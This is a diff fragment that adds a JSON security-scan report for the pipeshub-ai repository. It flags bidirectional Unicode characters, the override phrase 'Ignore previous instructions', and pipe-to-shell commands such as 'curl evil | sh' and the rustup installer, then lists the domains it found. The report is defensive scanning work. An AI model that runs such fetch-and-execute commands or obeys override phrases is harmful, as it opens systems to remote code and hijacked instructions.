+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/tests/unit/modules/indexing/test_record_title_consumer.py",
+      "line": 285,
+      "evidence": "\\u{202e}",
+      "file_sha256": "f6873d722a6c813cbd08e1fd2b39799f2ecd8f2235c9961ab7db6d61f711db16"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/tests/unit/modules/indexing/test_record_title_consumer.py",
+      "line": 572,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "f6873d722a6c813cbd08e1fd2b39799f2ecd8f2235c9961ab7db6d61f711db16"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/tests/unit/agents/adapter/test_prompt_builder.py",
+      "line": 1207,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "60330c901f7c9f16a51260c45f4336dc1c70c2ee9a93b89a59ac604b8ac48472"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/tests/unit/agents/mcp/test_stdio_policy.py",
+      "line": 60,
+      "evidence": "curl evil | sh",
+      "file_sha256": "3d4aad4314943cba707c8c645a8bedab40d882c3105422968468112f172c9a95"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/app/web/untrusted.py",
+      "line": 9,
+      "evidence": "\\u{202a}",
+      "file_sha256": "164cd621d31d7cae36483d0cac4a1f0384b58ebef4d3fe599d36d9180c5bade9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/backend/python/app/agents/agent_loop/sub_agent_prompt.py",
+      "line": 44,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "6edf230095959697066a5fc34c3e2f1ee1ebce54c17dc1c609705ab732a74822"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/Dockerfile.base",
+      "line": 112,
+      "evidence": "curl https://sh.rustup.rs -sSf | sh",
+      "file_sha256": "9c7f3f3d5493392cd5e3e42434ed2b51dc07143c0184a57f7943181a1d19f005"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pipeshub-ai-94eb1712963e459b6dd684e644eb64a09718edad/.github/workflows/published-hub-smoke.yml",
+      "line": 6,
+      "evidence": "curl | bash",
+      "file_sha256": "e2e114e2354d1a4bb4495f87efe3fcbe08bea774aa1d65a121756d113e678d0a"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "0.0.0.0",
+    "1.1.1.1",
+    "127.0.0.1",
+    "169.254.169.254",
+    "accounts.google.com",
+    "acme-ai.openai.azure.com",
+    "acme-robotics.example",
+    "acme.example.test",
+    "api.github.com",
+    "api.notion.com",
+    "api.slack.com",
+    "api.star-history.com",
+    "app.pipeshub.com",
+    "app.test",
+    "arxiv.org",
+    "auth.atlassian.com",
+    "brew.sh",
+    "confluence-sim-media.atlassian.net",
+    "confluence-sim.atlassian.net",
+    "connectors.test",
+    "deb.nodesource.com",
+    "discord.com",
+    "docs.docker.com",
+    "docs.github.com",
+    "docs.google.com",
+    "docs.pipeshub.com",
+    "download-r2.pytorch.org",
+    "download.pytorch.org",
+    "example.atlassian.net",
+    "example.com",
+    "example.invalid",
+    "example.openai.azure.com",
+    "example.test",
+    "external.invalid",
+    "files.pythonhosted.org",
+    "fonts.googleapis.com",
+    "gateway.test",
+    "get.pipeshub.com",
+    "github.com",
+    "gitlab.com",
+    "gmail-sim.internal",
+    "graph.microsoft.com",
+    "hooks.pipeshub.com",
+    "host.docker.internal",
+    "host.example",
+    "hub.docker.com",
+    "huggingface.co",
+    "i.ibb.co",
+    "img.shields.io",
+    "img.youtube.com",
+    "inai-90216.zendesk.com",
+    "it-admin-probe.invalid",
+    "it-mcp.invalid",
+    "jira-sim.internal",
+    "jira.internal.example",
+    "json-schema.org",
+    "kafka.apache.org",
+    "kind.sigs.k8s.io",
+    "learn.microsoft.com",
+    "linear.app",
+    "login.salesforce.com",
+    "lumenfold.atlassian.net",
+    "neo4j.com",
+    "notion-sim.internal",
+    "notion.so",
+    "oauth2.googleapis.com",
+    "omnigent.ai",
+    "opensource.org",
+    "owncloud.org",
+    "pipeshub.com",
+    "pipeshub.example.com",
+    "pipeshub.test",
+    "pipeshub.yourdomain.com",
+    "playwright.dev",
+    "plum-myrtle-9f7.notion.site",
+    "portal.example.com",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "s3.console.aws.amazon.com",
+    "salesforce-sim.internal",
+    "sh.rustup.rs",
+    "slack.com",
+    "stack.test",
+    "status.pipeshub.com",
+    "test.pipeshub.com",
+    "trendshift.io",
+    "upload.test",
+    "uploads.linear.app",
+    "www.googleapis.com",
+    "www.linkedin.com",
+    "www.notion.so",
+    "www.npmjs.com",
+    "www.pipeshub.com",
+    "www.star-history.com",
+    "www.w3.org",
+    "www.youtube.com",
+    "x.com",
+    "xxxx.databases.neo4j.io",
+    "your-pipeshub.example.com",
+    "youtu.be"
+  ],
+  "install_script": false,
+  "score": "high"
+}
